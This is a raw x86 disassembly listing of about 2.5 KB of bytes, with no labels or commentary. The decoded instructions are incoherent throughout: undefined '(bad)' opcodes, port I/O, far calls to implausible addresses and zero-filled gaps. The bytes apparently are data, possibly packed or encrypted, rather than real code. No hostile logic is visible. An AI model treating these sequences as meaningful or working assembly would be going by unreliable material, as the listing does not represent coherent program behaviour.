  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    al,BYTE PTR fs:[bx+si-0x17]
  422f42:	dec    ebx
  422f43:	fstp   DWORD PTR [edx]
  422f45:	jne    0x422f48
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    ch,cl
  422f4d:	test   al,0xbb
  422f4f:	xchg   ecx,eax
  422f50:	xchg   ecx,eax
  422f51:	or     BYTE PTR [ecx+ebx*2],0xc8
  422f55:	xor    al,0xbd
  422f57:	xchg   edi,ebx
  422f59:	sbb    DWORD PTR [edx],esp
  422f5b:	cmc    
  422f5c:	adc    al,0x46
  422f5e:	shl    BYTE PTR [ebp-0x3e],1
  422f61:	fsubr  QWORD PTR [ebp-0x7e]
  422f64:	jg     0x422f42
  422f66:	and    DWORD PTR [esi+0x79],ebx
  422f69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6a:	or     ebp,DWORD PTR [ecx-0x2a8062cd]
  422f70:	pop    edx
  422f71:	inc    eax
  422f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f73:	iret   
  422f74:	xchg   ecx,eax
  422f75:	ss jae 0x422f2a
  422f78:	pop    ecx
  422f79:	es scas al,BYTE PTR es:[edi]
  422f7b:	addr16 mov cl,0xe1
  422f7e:	pop    es
  422f7f:	mov    WORD PTR [ebp-0x30a2c531],ss
  422f85:	add    ebp,esp
  422f87:	shl    DWORD PTR [eax-0x19],0xcf
  422f8b:	les    edi,FWORD PTR [edx+0x483f02c8]
  422f91:	push   0x65
  422f93:	loope  0x422f45
  422f95:	inc    edi
  422f96:	or     edx,edx
  422f98:	sbb    ah,BYTE PTR [edx-0x3ed651f0]
  422f9e:	retf   
  422f9f:	ins    BYTE PTR es:[edi],dx
  422fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa1:	pop    ecx
  422fa2:	jnp    0x422f99
  422fa4:	pop    ebx
  422fa5:	cli    
  422fa6:	xor    ebx,DWORD PTR [ebp+0x2a]
  422fa9:	fsub   st,st(1)
  422fab:	shl    BYTE PTR [edx-0x30e9f76a],cl
  422fb1:	push   ds
  422fb2:	jmp    0x422fc3
  422fb4:	pop    ds
  422fb5:	mov    ebp,DWORD PTR [edi]
  422fb7:	push   ss
  422fb8:	mov    al,ds:0x569583ef
  422fbd:	pop    eax
  422fbe:	xchg   ebp,eax
  422fbf:	shl    BYTE PTR ds:0x3dd652c5,1
  422fc5:	retf   0xe343
  422fc8:	push   esp
  422fc9:	xchg   ecx,eax
  422fca:	fcom   QWORD PTR [edx+ecx*1+0x74]
  422fce:	cmp    edx,edx
  422fd0:	repz mov esi,0x98264ca4
  422fd6:	jle    0x422f62
  422fd8:	ja     0x422f8d
  422fda:	loope  0x42301f
  422fdc:	std    
  422fdd:	loope  0x422fad
  422fdf:	jnp    0x42302f
  422fe1:	jns    0x423027
  422fe3:	rol    BYTE PTR cs:[ebx],1
  422fe6:	or     ah,BYTE PTR [ebx+0x12]
  422fe9:	int    0x6a
  422feb:	dec    esi
  422fec:	pushw  cs
  422fee:	dec    edi
  422fef:	xchg   ebx,ecx
  422ff1:	out    0x57,al
  422ff3:	sbb    bl,BYTE PTR [edi+0x5d]
  422ff6:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422ff8:	xor    eax,0xad2f9b80
  422ffd:	cmp    DWORD PTR [esi+0x584f9840],esp
  423003:	popf   
  423004:	ss pop ebx
  423006:	xchg   ebp,eax
  423007:	xor    bh,BYTE PTR [edi+0x504c6ebe]
  42300d:	retf   
  42300e:	and    ecx,DWORD PTR [ecx-0x6c]
  423011:	sub    al,0xd1
  423013:	scas   eax,DWORD PTR es:[edi]
  423014:	dec    ebp
  423015:	pushf  
  423016:	leave  
  423017:	xor    BYTE PTR [ebx+0x46],bh
  42301a:	jmp    0x423018
  42301c:	xchg   esp,eax
  42301d:	in     eax,0x94
  42301f:	sbb    al,0x4d
  423021:	fst    DWORD PTR [ecx-0x3d]
  423024:	push   ecx
  423025:	push   cs
  423026:	xchg   esp,eax
  423027:	cmp    DWORD PTR [esi],esi
  423029:	xchg   dl,bl
  42302b:	inc    edx
  42302c:	jns    0x423014
  42302e:	adc    al,0xce
  423030:	gs mov al,0x51
  423033:	(bad)  
  423034:	sub    al,al
  423036:	add    BYTE PTR [ecx],dl
  423038:	in     al,dx
  423039:	sti    
  42303a:	xchg   edi,eax
  42303b:	aas    
  42303c:	bound  esi,QWORD PTR [ecx-0x16]
  42303f:	fdiv   DWORD PTR [esi]
	...
  4230b1:	add    BYTE PTR [eax],al
  4230b3:	add    BYTE PTR [esi-0x284ae],ah
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	jno    0x4230bd
  4230c2:	pop    edi
  4230c3:	sub    al,0xf
  4230c5:	jbe    0x4230c8
  4230c7:	add    ch,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    dh,ch
  4230cd:	arpl   WORD PTR [ebx],si
  4230cf:	sub    eax,0xe0dcdaf5
  4230d4:	mov    ds:0xa4e45838,al
  4230d9:	cld    
  4230da:	xchg   esi,eax
  4230db:	loopne 0x42306c
  4230dd:	inc    edi
  4230de:	cdq    
  4230df:	mov    edx,esp
  4230e1:	pop    ebx
  4230e2:	je     0x423157
  4230e4:	sti    
  4230e5:	in     eax,dx
  4230e6:	mov    esi,0x8938cb24
  4230eb:	shr    BYTE PTR [ebx-0x1],0x24
  4230ef:	pop    ecx
  4230f0:	dec    esp
  4230f1:	gs repz (bad) 
  4230f4:	loope  0x4230b6
  4230f6:	inc    esp
  4230f7:	dec    edx
  4230f8:	mov    cl,0x76
  4230fa:	test   DWORD PTR [esi+0x31],ecx
  4230fd:	push   esp
  4230fe:	add    DWORD PTR [edi-0x71b7ddae],eax
  423104:	xchg   ebp,eax
  423105:	push   edx
  423106:	imul   eax,DWORD PTR [edx+0x87b6819],0x12a48da
  423110:	loop   0x42309b
  423112:	aas    
  423113:	sub    al,BYTE PTR ds:0x6648198f
  423119:	push   eax
  42311a:	sub    al,0xbb
  42311c:	add    eax,0x7ff6aa19
  423121:	clc    
  423122:	popf   
  423123:	sbb    BYTE PTR [ebx+0x2],ah
  423126:	dec    esi
  423127:	scas   al,BYTE PTR es:[edi]
  423128:	std    
  423129:	jmp    0x4230f7
  42312b:	pushaw 
  42312d:	push   es
  42312e:	mov    eax,ds:0xf2b7741d
  423133:	push   ebp
  423134:	fcomp  DWORD PTR [edi+0x58924719]
  42313a:	fcmovbe st,st(6)
  42313c:	mov    bl,0x4c
  42313e:	ds pop ds
  423140:	test   eax,0x266cc4e7
  423145:	sbb    al,bh
  423147:	sub    dl,al
  423149:	or     al,0xfb
  42314b:	std    
  42314c:	jmp    0x423145
  42314e:	std    
  42314f:	adc    al,0x3
  423151:	and    edi,DWORD PTR ds:0x3cb272b2
  423157:	ins    BYTE PTR es:[edi],dx
  423158:	js     0x42312f
  42315a:	stc    
  42315b:	stos   DWORD PTR es:[edi],eax
  42315c:	fiadd  WORD PTR [ecx]
  42315e:	and    ecx,DWORD PTR [ebx]
  423160:	call   0x9651536
  423165:	mov    ebx,DWORD PTR [ecx]
  423167:	test   al,dh
  423169:	fisub  DWORD PTR [ecx]
  42316b:	loope  0x4230ed
  42316d:	or     al,BYTE PTR ss:0xf759da0b
  423174:	aad    0x38
  423176:	jmp    0x3ddce1e6
  42317b:	fmul   QWORD PTR [edx-0x1a]
  42317e:	cmp    DWORD PTR [ecx],ebp
  423180:	aaa    
  423181:	les    ebp,FWORD PTR [ecx]
  423183:	jp     0x4231fd
  423185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423186:	mov    ebp,gs
  423188:	xchg   DWORD PTR [edi-0x3a43fd13],esp
  42318e:	jge    0x423110
  423190:	aas    
  423191:	jg     0x423199
  423193:	jmp    0x4231dd
  423195:	js     0x42318e
  423197:	fwait
  423198:	lods   al,BYTE PTR ds:[esi]
  423199:	adc    al,0x54
  42319b:	sbb    cl,dh
  42319d:	dec    ebx
  42319e:	les    edi,FWORD PTR [edi+0x59]
  4231a1:	shl    ebx,1
  4231a3:	adc    al,0x77
  4231a5:	cmp    eax,ebp
  4231a7:	cmp    ah,BYTE PTR [ebx]
  4231a9:	pop    ebp
  4231aa:	in     eax,dx
  4231ab:	mov    edi,0x858df8c0
  4231b0:	pop    ecx
  4231b1:	push   es
  4231b2:	mov    al,0xe6
  4231b4:	pushf  
  4231b5:	add    edx,edi
  4231b7:	pop    esp
  4231b8:	push   ds
  4231b9:	adc    ecx,esp
  4231bb:	(bad)  
  4231bc:	lds    edi,FWORD PTR ds:0xe7113c
	...
  423232:	add    BYTE PTR [eax],al
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xbb6067b0
  423243:	sbb    eax,DWORD PTR [edi+esi*2]
  423246:	add    DWORD PTR [eax],eax
  423248:	cmc    
  423249:	add    BYTE PTR [eax],al
  42324b:	add    al,al
  42324d:	cmp    DWORD PTR [ebp-0x55225561],ebx
  423253:	pusha  
  423254:	and    al,BYTE PTR [esi-0x6a]
  423257:	lods   eax,DWORD PTR ds:[esi]
  423258:	addr16 in eax,0x93
  42325b:	repz pop edi
  42325d:	xor    eax,0x76991746
  423262:	sbb    edx,DWORD PTR [eax-0x707e558f]
  423268:	push   edi
  423269:	retf   0xa0f9
  42326c:	ss xor dh,0x6d
  423270:	call   0x9fde:0x88503c8e
  423277:	sbb    eax,0xb5bec99f
  42327c:	dec    esp
  42327d:	pop    ss
  42327e:	int    0x21
  423280:	pop    eax
  423281:	adc    DWORD PTR [eax+0x36],eax
  423284:	sbb    DWORD PTR [ebx],ecx
  423286:	pop    esi
  423287:	cli    
  423288:	and    ebx,DWORD PTR [edi-0x61e60782]
  42328e:	push   edi
  42328f:	sbb    al,0xfc
  423291:	adc    DWORD PTR [edx+0x57b4c4d0],ecx
  423297:	out    0x91,eax
  423299:	das    
  42329a:	xchg   edx,eax
  42329b:	dec    edi
  42329c:	inc    edi
  42329d:	fist   WORD PTR [eax+0x79]
  4232a0:	pusha  
  4232a1:	mov    edi,0xfaeab964
  4232a6:	jns    0x423256
  4232a8:	test   BYTE PTR [edi-0x80],dh
  4232ab:	xor    edi,DWORD PTR [edx+edx*1-0x37deeda4]
  4232b2:	(bad)  
  4232b3:	xchg   edi,eax
  4232b4:	fisubr WORD PTR [edx-0x37]
  4232b7:	addr16 hlt 
  4232b9:	ficom  DWORD PTR [edi-0x48]
  4232bc:	test   eax,0x33dbcee7
  4232c1:	and    al,0x5f
  4232c3:	and    BYTE PTR [ecx-0x41eb2ba4],bh
  4232c9:	in     eax,dx
  4232ca:	xor    BYTE PTR [eax+0x29058738],dl
  4232d0:	ins    BYTE PTR es:[edi],dx
  4232d1:	out    0xc9,al
  4232d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232d4:	cwde   
  4232d5:	pop    ss
  4232d6:	mov    esi,0x650501bf
  4232db:	sbb    ebx,DWORD PTR [ebx]
  4232dd:	xchg   esi,eax
  4232de:	xchg   ecx,eax
  4232df:	adc    ch,BYTE PTR [esi-0x1b8aedd2]
  4232e5:	aaa    
  4232e6:	loopne 0x423302
  4232e8:	stos   DWORD PTR es:[edi],eax
  4232e9:	add    DWORD PTR [ebx+0x1f],edx
  4232ec:	fdivr  st(7),st
  4232ee:	neg    BYTE PTR [edi+0x12a5c2d5]
  4232f4:	jl     0x42334a
  4232f6:	cld    
  4232f7:	jae    0x423343
  4232f9:	pop    edi
  4232fa:	sub    BYTE PTR [eax+0x75517e39],bh
  423300:	cmp    DWORD PTR [ecx-0x1ee9a7fb],eax
  423306:	mov    DWORD PTR [ebx+0x1e81326c],0xcab0dc87
  423310:	pop    es
  423311:	hlt    
  423312:	jne    0x423303
  423314:	or     DWORD PTR [edi],ecx
  423316:	test   DWORD PTR [edi-0x16df968c],ebx
  42331c:	int3   
  42331d:	out    0x62,eax
  42331f:	scas   eax,DWORD PTR es:[edi]
  423320:	test   BYTE PTR [edi+0x6e],bh
  423323:	add    dl,dh
  423325:	addr16 dec eax
  423327:	dec    ebx
  423328:	or     eax,edi
  42332a:	mov    WORD PTR ds:0x59c1a1cb,?
  423330:	mov    DWORD PTR [edi+ebx*1],edx
  423333:	ja     0x42335f
  423335:	(bad)  
  423336:	add    DWORD PTR [ebx+0x5a],ebp
  423339:	push   ds
  42333a:	xchg   DWORD PTR [ebx+0x34],edi
  42333d:	push   edi
  42333e:	and    dh,ch
  423340:	jns    0x423342
	...
  4233b2:	add    BYTE PTR [eax],al
  4233b4:	push   edx
  4233b5:	sub    BYTE PTR [esi],0x69
  4233b8:	(bad)  
  4233b9:	in     eax,dx
  4233ba:	push   edi
  4233bb:	mov    ebx,0x8e4aa104
  4233c0:	fnsave [ebx-0x1d]
  4233c3:	psubw  mm6,QWORD PTR [edi+0x1]
  4233c7:	add    ch,dh
  4233c9:	add    BYTE PTR [eax],al
  4233cb:	add    BYTE PTR [edx],ah
  4233cd:	ficom  WORD PTR [ebx-0x79]
  4233d0:	ins    BYTE PTR es:[edi],dx
  4233d1:	sub    al,0xde
  4233d3:	(bad)  
  4233d4:	gs arpl dx,di
  4233d7:	mulps  xmm5,xmm7
  4233da:	jb     0x423389
  4233dc:	dec    esi
  4233dd:	lea    edx,[ebp-0x2d]
  4233e0:	les    esp,FWORD PTR [ecx+0x481e347b]
  4233e6:	mov    cl,BYTE PTR [ebp-0x16]
  4233e9:	push   es
  4233ea:	jg     0x4233b6
  4233ec:	jne    0x423378
  4233ee:	push   ds
  4233ef:	(bad)  
  4233f0:	adc    esp,edi
  4233f2:	dec    ebx
  4233f3:	ja     0x42343f
  4233f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f6:	in     eax,dx
  4233f7:	push   edx
  4233f8:	dec    esi
  4233f9:	xchg   BYTE PTR [edx],dl
  4233fb:	adc    ah,BYTE PTR [ecx-0x66e6058e]
  423401:	lahf   
  423402:	ins    DWORD PTR es:[edi],dx
  423403:	push   0xfffffff0
  423405:	js     0x4233c4
  423407:	xor    al,0xed
  423409:	hlt    
  42340a:	aad    0xe9
  42340c:	into   
  42340d:	out    dx,al
  42340e:	xor    ah,BYTE PTR [edi]
  423410:	inc    ebx
  423411:	mov    ah,0x7d
  423413:	inc    DWORD PTR [ecx-0x33]
  423416:	scas   al,BYTE PTR es:[edi]
  423417:	loopne 0x423458
  423419:	push   edi
  42341a:	xor    ah,0x92
  42341d:	lods   al,BYTE PTR ds:[esi]
  42341e:	and    DWORD PTR [edi+0x1a],0xa
  423422:	xchg   esi,eax
  423423:	pop    eax
  423424:	cld    
  423425:	jmp    0x80a61bec
  42342a:	jns    0x423475
  42342c:	cwde   
  42342d:	jno    0x423457
  42342f:	ja     0x423456
  423431:	into   
  423432:	xlat   BYTE PTR ds:[ebx]
  423433:	cmp    dh,bl
  423435:	sbb    eax,0xdfebdec
  42343a:	fwait
  42343b:	cwde   
  42343c:	adc    al,0x60
  42343e:	fidivr WORD PTR ds:0xb73d4081
  423444:	and    eax,0x4fec08db
  423449:	nop
  42344a:	push   ds
  42344b:	and    al,0xe7
  42344d:	loop   0x423447
  42344f:	rcl    DWORD PTR [ebp+0x3e],0x6e
  423453:	cmp    ch,BYTE PTR [ebp+0x20]
  423456:	inc    BYTE PTR [ebp+ebx*4-0x14]
  42345a:	ficom  DWORD PTR [edx-0x80]
  42345d:	or     ecx,DWORD PTR [ecx+edx*1]
  423460:	arpl   WORD PTR [esi+0x52b427e9],sp
  423466:	daa    
  423467:	(bad)  ds:0xa49423ef
  42346d:	enter  0x5d5c,0x1a
  423471:	(bad)  
  423472:	jb     0x4234e4
  423474:	ds mov esi,0x42334e8
  42347a:	mov    al,0xae
  42347c:	dec    edi
  42347d:	mov    eax,0x63721634
  423482:	pusha  
  423483:	xchg   edi,eax
  423484:	mov    dl,0xc9
  423486:	or     eax,0xf757c597
  42348b:	push   ebp
  42348c:	pop    edx
  42348d:	push   ebx
  42348e:	push   es
  42348f:	daa    
  423490:	in     al,0xff
  423492:	out    dx,al
  423493:	pop    edx
  423494:	loopne 0x42345e
  423496:	lods   eax,DWORD PTR ds:[esi]
  423497:	mov    ah,0x27
  423499:	out    dx,al
  42349a:	xchg   ebx,eax
  42349b:	or     al,0xa2
  42349d:	sbb    eax,DWORD PTR [ecx-0x5f]
  4234a0:	adc    ebp,0x263fce5a
  4234a6:	call   0xc561:0x425fd2a
  4234ad:	push   ecx
  4234ae:	stc    
  4234af:	jnp    0x4234ac
  4234b1:	jbe    0x4234ea
  4234b3:	push   ss
  4234b4:	sub    BYTE PTR [esi],0xaf
  4234b7:	jle    0x42351c
  4234b9:	add    al,0xc0
  4234bb:	mov    ebx,0xa6261922
  4234c0:	sub    al,BYTE PTR [eax]
	...
  423532:	add    BYTE PTR [eax],al
  423534:	call   0xfa77:0xbf778fae
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x55
  423541:	or     DWORD PTR [esi+0x178eee0],esi
  423547:	add    ch,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [esi-0x4f9eca8f],bl
  423551:	sub    eax,0xf6be95e
  423556:	and    eax,0xc1b65006
  42355b:	outs   dx,BYTE PTR ds:[esi]
  42355c:	push   ebx
  42355d:	sub    DWORD PTR [edi+0x20],ebp
  423560:	out    dx,al
  423561:	int    0x65
  423563:	jno    0x4235bd
  423565:	pop    ecx
  423566:	xchg   edx,eax
  423567:	pop    edx
  423568:	test   DWORD PTR [edx+0x70],eax
  42356b:	retf   0xc9ba
  42356e:	sbb    edi,DWORD PTR [ecx+eax*1]
  423571:	cmp    esi,DWORD PTR [edx-0x24]
  423574:	and    eax,0x8a3a37c3
  423579:	cld    
  42357a:	test   eax,0x25f29dd9
  42357f:	push   edi
  423580:	mov    ah,0xe9
  423582:	cmc    
  423583:	adc    al,0xa9
  423585:	stos   DWORD PTR es:[edi],eax
  423586:	xchg   esp,eax
  423587:	out    0x70,eax
  423589:	fidivr DWORD PTR [edx]
  42358b:	fild   QWORD PTR [ebx+0x345439c9]
  423591:	xor    eax,0xbe393eef
  423596:	mov    WORD PTR [esp+ecx*2],cs
  423599:	je     0x42359d
  42359b:	push   eax
  42359c:	push   ecx
  42359d:	mov    al,ds:0x4859efb8
  4235a2:	sbb    BYTE PTR [ebx+0x20],ah
  4235a5:	in     eax,0x1c
  4235a7:	mov    ch,0x74
  4235a9:	ins    DWORD PTR es:[edi],dx
  4235aa:	xor    cl,cl
  4235ac:	jle    0x4235bc
  4235ae:	xchg   BYTE PTR [edi+0x6d9ee705],ah
  4235b4:	sbb    eax,0x2aad2a4
  4235b9:	cmp    eax,0x35ac46c2
  4235be:	push   ds
  4235bf:	push   ebx
  4235c0:	dec    edx
  4235c1:	adc    BYTE PTR [esi],dl
  4235c3:	or     eax,0xf525bbfb
  4235c8:	ins    DWORD PTR es:[edi],dx
  4235c9:	out    dx,eax
  4235ca:	outs   dx,BYTE PTR ds:[esi]
  4235cb:	out    dx,eax
  4235cc:	repnz pop esp
  4235ce:	es and al,0xb2
  4235d1:	popf   
  4235d2:	loope  0x423554
  4235d4:	cmp    DWORD PTR [edx+0x7bba7e1f],edx
  4235da:	mov    WORD PTR [edx+0x2b977c28],cs
  4235e0:	or     ecx,DWORD PTR [ecx+0x53]
  4235e3:	lahf   
  4235e4:	(bad)  
  4235e5:	call   0xc34aeffc
  4235ea:	test   DWORD PTR [edx-0x3],0x34fd0c8e
  4235f1:	jnp    0x4235e6
  4235f3:	(bad)  
  4235f4:	outs   dx,BYTE PTR ds:[esi]
  4235f5:	jae    0x4235c8
  4235f7:	ja     0x423601
  4235f9:	mov    ds:0x649f8e,eax
  4235fe:	cmp    al,0x29
  423600:	xchg   esp,eax
  423601:	into   
  423602:	inc    ecx
  423603:	vpmacssdd ymm7,ymm7,ymm6,YMMWORD PTR [eax]
  423609:	jnp    0x4235bd
  42360b:	fs dec esp
  42360d:	inc    ebx
  42360e:	push   esp
  42360f:	test   BYTE PTR fs:[edi],bl
  423612:	xchg   edi,eax
  423613:	enter  0x6757,0x69
  423617:	mov    cl,0x17
  423619:	loope  0x4235c4
  42361b:	dec    esp
  42361c:	in     eax,0x74
  42361e:	and    ah,BYTE PTR [edi-0x1e]
  423621:	sbb    edi,ebp
  423623:	push   0xffffffc7
  423625:	out    dx,al
  423626:	push   0x1c35cfd9
  42362b:	push   es
  42362c:	cmp    edx,DWORD PTR [ecx+0x15a733fa]
  423632:	ror    ebp,0xf2
  423635:	fs test ecx,ecx
  423638:	cld    
  423639:	pop    ebp
  42363a:	test   al,0xd6
  42363c:	and    DWORD PTR [edi],ebp
  42363e:	enter  0xffa8,0x0
	...
  4236b2:	add    BYTE PTR [eax],al
  4236b4:	daa    
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm1,mm2
  4236c1:	jmp    0x7a25f01b
  4236c6:	add    DWORD PTR [eax],eax
  4236c8:	cmc    
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    cl,ch
  4236cd:	add    bh,dh
  4236cf:	cmc    
  4236d0:	mov    ebp,0xeaf08693
  4236d5:	pop    ebp
  4236d6:	outs   dx,BYTE PTR ds:[esi]
  4236d7:	push   es
  4236d8:	jmp    0xf1ba3133
  4236dd:	jmp    0x2cd8f108
  4236e2:	rcl    DWORD PTR [eax-0x4c75ad2],cl
  4236e8:	sbb    eax,DWORD PTR cs:[esi+0xe855623]
  4236ef:	pop    ss
  4236f0:	xor    al,0x11
  4236f2:	sbb    al,bl
  4236f4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236f6:	in     eax,dx
  4236f7:	sbb    BYTE PTR [edi+0x65],ah
  4236fa:	mov    al,ds:0x99fccaf6
  4236ff:	jb     0x42376c
  423701:	cwde   
  423702:	sti    
  423703:	push   ebp
  423704:	hlt    
  423705:	loop   0x4236ec
  423707:	sub    al,0xcf
  423709:	push   esi
  42370a:	test   DWORD PTR [edi+0x6b],esi
  42370d:	popa   
  42370e:	pushf  
  42370f:	mov    eax,gs:0x1cf7f35a
  423715:	inc    esp
  423716:	mov    esp,0xf0ceac16
  42371b:	sub    BYTE PTR [ebp-0x59],0xb7
  42371f:	add    dl,bl
  423721:	sbb    edi,DWORD PTR [esi+0x48]
  423724:	dec    ebx
  423725:	sub    bh,ah
  423727:	pop    edx
  423728:	cmp    al,0xe1
  42372a:	mov    dl,0x45
  42372c:	aaa    
  42372d:	dec    eax
  42372e:	out    0x9a,eax
  423730:	outs   dx,BYTE PTR ds:[esi]
  423731:	daa    
  423732:	test   al,0x29
  423734:	repz sbb eax,0x60d989e5
  42373a:	jnp    0x423749
  42373c:	aaa    
  42373d:	repz xor BYTE PTR [edi-0x4a],cl
  423741:	xchg   ecx,eax
  423742:	outs   dx,BYTE PTR ds:[esi]
  423743:	pop    edi
  423744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423745:	(bad)  
  423746:	sti    
  423747:	lods   al,BYTE PTR ds:[esi]
  423748:	clc    
  423749:	idiv   DWORD PTR [esi-0x23f53ba7]
  42374f:	ret    
  423750:	jge    0x42372c
  423752:	cwde   
  423753:	xchg   ebx,eax
  423754:	lahf   
  423755:	pushf  
  423756:	cmp    ch,dh
  423758:	add    ebp,DWORD PTR [edx+0x33]
  42375b:	and    ebx,esi
  42375d:	ja     0x423763
  42375f:	inc    esi
  423760:	cwde   
  423761:	js     0x42375e
  423763:	mov    ds:0x29d56b3c,al
  423768:	push   cs
  423769:	cdq    
  42376a:	scas   eax,DWORD PTR es:[edi]
  42376b:	pop    es
  42376c:	in     eax,0xb8
  42376e:	sbb    ecx,DWORD PTR [eax]
  423770:	imul   eax,DWORD PTR [esi],0xffffffe3
  423773:	jnp    0x4237bc
  423775:	mov    esp,DWORD PTR [edx]
  423777:	sbb    BYTE PTR [ebx],ch
  423779:	xchg   ecx,eax
  42377a:	push   ebx
  42377b:	out    0xa,eax
  42377d:	enter  0x7117,0x1f
  423781:	dec    edx
  423782:	push   esi
  423783:	call   0xd508:0xc2cb6a9c
  42378a:	fnstcw WORD PTR ds:0xa8ab8a2
  423790:	xchg   ebx,eax
  423791:	mov    eax,0x1e72d9ba
  423796:	mov    BYTE PTR [ecx+0x5],ch
  423799:	cmp    DWORD PTR [ecx-0x42],esi
  42379c:	repnz test al,0xa
  42379f:	pop    esp
  4237a0:	loopne 0x423734
  4237a2:	pushf  
  4237a3:	xchg   BYTE PTR [ebx],dh
  4237a5:	inc    esp
  4237a6:	clc    
  4237a7:	call   0xd5138c7c
  4237ac:	push   esi
  4237ad:	jle    0x4237dc
  4237af:	shr    DWORD PTR [ebp-0x72],1
  4237b2:	mov    al,0x8b
  4237b4:	aad    0x12
  4237b6:	xchg   ebx,ecx
  4237b8:	mov    ds,WORD PTR [eax+0x6fc451df]
  4237be:	push   esp
  4237bf:	ror    BYTE PTR [eax],cl
	...
  423831:	add    BYTE PTR [eax],al
  423833:	add    ch,cl
  423835:	cmp    DWORD PTR [eax-0x10680369],edi
  42383b:	jnp    0x423814
  42383d:	jge    0x4238a4
  42383f:	xchg   ecx,eax
  423840:	sbb    cl,BYTE PTR [edx-0x2c]
  423843:	test   al,bl
  423845:	jp     0x423848
  423847:	add    ch,dh
  423849:	add    BYTE PTR [eax],al
  42384b:	add    BYTE PTR [ebx+0x660a14df],bl
  423851:	int3   
  423852:	shr    dh,0xa2
  423855:	mov    ch,0x1b
  423857:	jmp    0x42388d
  423859:	pusha  
  42385a:	aad    0xfd
  42385c:	xor    ch,BYTE PTR [eax]
  42385e:	xchg   ebx,eax
  42385f:	adc    al,0x29
  423861:	push   ebx
  423862:	imul   esp,DWORD PTR [eax+ebx*8],0x3b3c1a1f
  423869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42386a:	adc    DWORD PTR [ebp-0x67],esi
  42386d:	imul   BYTE PTR [ecx+0x76]
  423870:	sbb    ax,0x404b
  423874:	dec    edx
  423875:	xor    eax,0x3ea4d16f
  42387a:	mov    ds,WORD PTR [ebx+0x1c]
  42387d:	scas   eax,DWORD PTR es:[edi]
  42387e:	jl     0x4238d0
  423880:	inc    ebp
  423881:	pop    esp
  423882:	push   cs
  423883:	shl    DWORD PTR [eax-0x4a012fe9],cl
  423889:	bound  esp,QWORD PTR ds:0xfa9cd2b9
  42388f:	sub    DWORD PTR ds:[ebp+0x54],0x4c
  423894:	sbb    esi,0x6b
  423897:	jae    0x423899
  423899:	push   cs
  42389a:	xchg   edx,eax
  42389b:	lds    ebp,FWORD PTR [esi+0x5b]
  42389e:	ja     0x423820
  4238a0:	stos   BYTE PTR es:[edi],al
  4238a1:	mov    esp,0x33cfdea4
  4238a6:	cmp    DWORD PTR ds:0x9cc6744a,eax
  4238ac:	push   si
  4238ae:	ds sbb al,0x19
  4238b1:	and    dh,dh
  4238b3:	cmp    ebx,DWORD PTR [edi+0x1e]
  4238b6:	daa    
  4238b7:	shr    DWORD PTR [ecx-0x9],cl
  4238ba:	dec    ebp
  4238bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238bc:	push   ss
  4238bd:	test   ebx,0xe5b71eff
  4238c3:	scas   eax,DWORD PTR es:[edi]
  4238c4:	call   0xd751:0x39996a8a
  4238cb:	xor    DWORD PTR [ebp-0x3c9fb556],eax
  4238d1:	sub    esp,edi
  4238d3:	sti    
  4238d4:	repnz dec ecx
  4238d6:	(bad)  
  4238d7:	(bad)  
  4238d9:	(bad)  
  4238db:	xchg   edx,eax
  4238dc:	sbb    al,0x8c
  4238de:	popf   
  4238df:	ja     0x4238db
  4238e1:	fcomp  QWORD PTR [ecx-0x2295c65f]
  4238e7:	pushf  
  4238e8:	out    0xc,al
  4238ea:	or     eax,DWORD PTR [ecx]
  4238ec:	ins    DWORD PTR es:[edi],dx
  4238ed:	test   al,0x7f
  4238ef:	or     dh,BYTE PTR [esi]
  4238f1:	mov    al,ds:0xbda7150f
  4238f6:	nop
  4238f7:	push   es
  4238f8:	mov    bh,0x19
  4238fa:	(bad)  
  4238fb:	push   DWORD PTR [ebp+0x47]
  4238fe:	idiv   BYTE PTR [ebx+0x62]
  423901:	sbb    eax,0xa52368ce
  423906:	rcl    BYTE PTR [ebp+ecx*2+0x4e409803],cl
  42390d:	and    BYTE PTR gs:[edi+ebp*2+0x3d0e1f0b],0xbc
  423916:	retf   
  423917:	jl     0x42396c
  423919:	mov    eax,0xf104d1c
  42391e:	popf   
  42391f:	(bad)  
  423920:	(bad)  
  423922:	mov    ebp,0x6bde28e7
  423927:	out    0xcb,al
  423929:	jb     0x4238f1
  42392b:	and    ah,bl
  42392d:	gs lahf 
  42392f:	add    cl,BYTE PTR [ebp-0x5c]
  423932:	je     0x423960
  423934:	retf   
  423935:	fidivr DWORD PTR [eax+0x2fb9072b]
  42393b:	fcomi  st,st(3)
  42393d:	fwait
  42393e:	and    eax,0xbf1a
	...
  4239b3:	add    BYTE PTR [esi-0x377e796],dl
  4239b9:	cli    
  4239ba:	xchg   esi,eax
  4239bb:	jle    0x4239aa
  4239bd:	mov    cl,0x66
  4239bf:	mov    WORD PTR [esi+0x7b],gs
  4239c2:	dec    ebp
